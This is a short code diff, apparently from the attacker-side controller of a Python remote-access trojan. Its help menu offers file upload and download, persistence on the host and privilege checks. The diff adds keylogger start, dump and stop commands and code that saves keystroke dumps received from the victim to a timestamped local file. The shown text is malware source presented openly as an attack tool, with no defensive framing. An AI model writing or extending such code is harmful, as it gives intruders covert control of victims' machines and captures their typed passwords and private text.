@@ -25,7 +25,9 @@ def shell():
                   '\n- upload {file} => Upload a file to the host'
                   '\n- persistence => Try acquiring persistence'
                   '\n- get {url} => Download a remote file'
-                  '\n- isadmin => Check user privileges')
+                  '\n- isadmin => Check user privileges'
+                  '\n- keylogger start|dump|stop => start the keylogger|dump the log keylog|stop the keylogger'
+                  '\n- exit => quit the service')
         elif cmd.startswith("cd") and len(cmd) > 1:
             reliable_send(cmd)
         elif cmd.startswith("download"):
@@ -114,6 +116,9 @@ def keylogger(cmd):
         if c.startswith("dump"):
             reliable_send(cmd)
             keylogs = reliable_recv()
+            if keylogs.startswith("[!!] "):
+                print(keylogs)
+                return
             with open("keylogdump.txt", "a") as file:
                 now = datetime.now()
                 file.write("\n----------- Log date: " + str(now) + "-----------\n")
